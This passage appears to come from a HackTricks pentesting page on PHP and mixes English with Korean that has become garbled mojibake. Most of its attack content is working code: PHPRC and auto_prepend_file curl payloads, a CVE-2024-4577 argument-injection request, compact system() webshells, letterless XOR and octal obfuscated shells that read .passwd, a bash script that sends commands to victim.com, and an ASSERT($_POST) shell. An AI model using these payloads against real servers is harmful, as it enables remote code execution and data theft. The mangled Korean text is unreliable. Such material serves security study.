You can also use **//** to comment the rest of the code.

To discover the number of parenthesis that you need to close:

* `?order=id;}//`: ìš°ë¦¬ëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€(`Parse error: syntax error, unexpected ';'`)ë¥¼ ë°›ìŠµë‹ˆë‹¤. ì•„ë§ˆë„ í•˜ë‚˜ ì´ìƒì˜ ê´„í˜¸ê°€ ëˆ„ë½ë˜ì—ˆìŠµë‹ˆë‹¤.
* `?order=id);}//`: ìš°ë¦¬ëŠ” **ê²½ê³ **ë¥¼ ë°›ìŠµë‹ˆë‹¤. ê·¸ê²Œ ë§ëŠ” ê²ƒ ê°™ìŠµë‹ˆë‹¤.
* `?order=id));}//`: ìš°ë¦¬ëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€(`Parse error: syntax error, unexpected ')' i`)ë¥¼ ë°›ìŠµë‹ˆë‹¤. ì•„ë§ˆë„ ë‹«ëŠ” ê´„í˜¸ê°€ ë„ˆë¬´ ë§ìŠµë‹ˆë‹¤.

### **RCE via .httaccess**

If you can **upload** a **.htaccess**, then you can **configure** several things and even execute code (configuring that files with extension .htaccess can be **executed**).

Different .htaccess shells can be found [here](https://github.com/wireghoul/htshells)

### RCE via Env Variables

If you find a vulnerability that allows you to **modify env variables in PHP** (and another one to upload files, although with more research maybe this can be bypassed), you could abuse this behaviour to get **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): ì´ env ë³€ìˆ˜ëŠ” ë‹¤ë¥¸ ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•  ë•Œ ì„ì˜ì˜ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤(ì´ ê²½ìš°ì—ëŠ” ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤).
* **`PHPRC`** : PHPì— **êµ¬ì„± íŒŒì¼ì˜ ìœ„ì¹˜**ë¥¼ ì§€ì‹œí•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ `php.ini`ë¼ê³  ë¶ˆë¦½ë‹ˆë‹¤. ìì‹ ì˜ êµ¬ì„± íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆë‹¤ë©´, `PHPRC`ë¥¼ ì‚¬ìš©í•˜ì—¬ PHPê°€ ì´ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ í•˜ì‹­ì‹œì˜¤. ë‘ ë²ˆì§¸ ì—…ë¡œë“œëœ íŒŒì¼ì„ ì§€ì •í•˜ëŠ” **`auto_prepend_file`** í•­ëª©ì„ ì¶”ê°€í•©ë‹ˆë‹¤. ì´ ë‘ ë²ˆì§¸ íŒŒì¼ì€ ì¼ë°˜ **PHP ì½”ë“œ**ë¥¼ í¬í•¨í•˜ë©°, ì´ëŠ” ë‹¤ë¥¸ ì½”ë“œë³´ë‹¤ ë¨¼ì € PHP ëŸ°íƒ€ì„ì— ì˜í•´ ì‹¤í–‰ë©ë‹ˆë‹¤.
1. ìš°ë¦¬ì˜ ì‰˜ì½”ë“œë¥¼ í¬í•¨í•˜ëŠ” PHP íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.
2. 1ë‹¨ê³„ì—ì„œ ì—…ë¡œë“œí•œ íŒŒì¼ì„ ì‹¤í–‰í•˜ë„ë¡ PHP ì „ì²˜ë¦¬ê¸°ì— ì§€ì‹œí•˜ëŠ” **`auto_prepend_file`** ì§€ì‹œì–´ë¥¼ í¬í•¨í•˜ëŠ” ë‘ ë²ˆì§¸ íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.
3. 2ë‹¨ê³„ì—ì„œ ì—…ë¡œë“œí•œ íŒŒì¼ë¡œ `PHPRC` ë³€ìˆ˜ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.
* ì´ ì²´ì¸ì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” [**ì›ë³¸ ë³´ê³ ì„œ**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)ì—ì„œ í™•ì¸í•˜ì‹­ì‹œì˜¤.
* **PHPRC** - ë˜ ë‹¤ë¥¸ ì˜µì…˜
* íŒŒì¼ì„ **ì—…ë¡œë“œí•  ìˆ˜ ì—†ëŠ” ê²½ìš°**, FreeBSDì—ì„œ **`stdin`**ì„ í¬í•¨í•˜ëŠ” "íŒŒì¼" `/dev/fd/0`ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* ë˜ëŠ” RCEë¥¼ ì–»ê¸° ìœ„í•´ **`allow_url_include`**ë¥¼ í™œì„±í™”í•˜ê³  **base64 PHP ì½”ë“œ**ê°€ í¬í•¨ëœ íŒŒì¼ì„ ì „ì²˜ë¦¬í•©ë‹ˆë‹¤:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* ê¸°ìˆ  [**ì´ ë³´ê³ ì„œ**](https://vulncheck.com/blog/juniper-cve-2023-36845)ì—ì„œ.

### XAMPP CGI RCE - CVE-2024-4577

The webserver parses HTTP requests and passes them to a PHP script executing a request such as as [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar\&ref=labs.watchtowr.com) as `php.exe cgi.php foo=bar`, which allows a parameter injection. This would allow to inject the following parameters to load the PHP code from the body:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
ë˜í•œ, PHPì˜ í›„ì† ì •ê·œí™”ë¡œ ì¸í•´ 0xAD ë¬¸ìë¥¼ ì‚¬ìš©í•˜ì—¬ "-" ë§¤ê°œë³€ìˆ˜ë¥¼ ì£¼ì…í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. [**ì´ ê²Œì‹œë¬¼**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/)ì˜ ìµìŠ¤í”Œë¡œì‡ ì˜ˆì œë¥¼ í™•ì¸í•˜ì„¸ìš”.
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**ì´ ê²Œì‹œë¬¼ì—ì„œ**](https://blog.redteam-pentesting.de/2024/moodle-rce/) ë§¤ìš° ì ì€ ë¬¸ìë¡œ ë¸Œë ˆì¸ í‘í¬ PHP ì½”ë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” í›Œë¥­í•œ ì•„ì´ë””ì–´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê²Œë‹¤ê°€ ì—¬ëŸ¬ ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë„ë¡ í—ˆìš©ëœ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ëŠ” í¥ë¯¸ë¡œìš´ ë°©ë²•ë„ ì œì•ˆë©ë‹ˆë‹¤:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP ì •ì  ë¶„ì„

ì´ í•¨ìˆ˜ í˜¸ì¶œì— ì½”ë“œ ì‚½ì…ì´ ê°€ëŠ¥í•œì§€ í™•ì¸í•˜ì„¸ìš” (ì—¬ê¸°ì„œ): [here](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
If yo are debugging a PHP application you can globally enable error printing in`/etc/php5/apache2/php.ini` adding `display_errors = On` and restart apache : `sudo systemctl restart apache2`

### PHP ì½”ë“œ ë””ì˜¤ë¸Œí¼ìŠ¤ì¼€ì´íŒ…

You can use the **web**[ **www.unphp.net**](http://www.unphp.net) **to deobfuscate php code.**

## PHP ë˜í¼ ë° í”„ë¡œí† ì½œ

PHP Wrappers ad protocols could allow you to **bypass write and read protections** in a system and compromise it. For [**more information check this page**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug ì¸ì¦ë˜ì§€ ì•Šì€ RCE

If you see that **Xdebug** is **enabled** in a `phpconfig()` output you should try to get RCE via [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## ë³€ìˆ˜ ë³€ìˆ˜
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE abusing new $\_GET\["a"]\($\_GET\["b")

í˜ì´ì§€ì—ì„œ **ì„ì˜ í´ë˜ìŠ¤ì˜ ìƒˆ ê°ì²´ë¥¼ ìƒì„±í•  ìˆ˜ ìˆë‹¤ë©´** RCEë¥¼ ì–»ì„ ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤. ë°©ë²•ì„ ë°°ìš°ë ¤ë©´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Execute PHP without letters

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Using octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
```
### XOR ì‰¬ìš´ ì…¸ ì½”ë“œ

[**ì´ ê¸€** ](https://mgp25.com/ctf/Web-challenge/)ì— ë”°ë¥´ë©´, ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì‰¬ìš´ ì…¸ ì½”ë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
ê·¸ë˜ì„œ, **ìˆ«ìì™€ ë¬¸ìê°€ ì—†ëŠ” ì„ì˜ì˜ PHPë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´** ë‹¤ìŒê³¼ ê°™ì€ ìš”ì²­ì„ ë³´ë‚´ ì„ì˜ì˜ PHPë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
ë” ìì„¸í•œ ì„¤ëª…ì€ [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

### XOR Shellcode (eval ë‚´ë¶€)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perlê³¼ ìœ ì‚¬í•œ
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
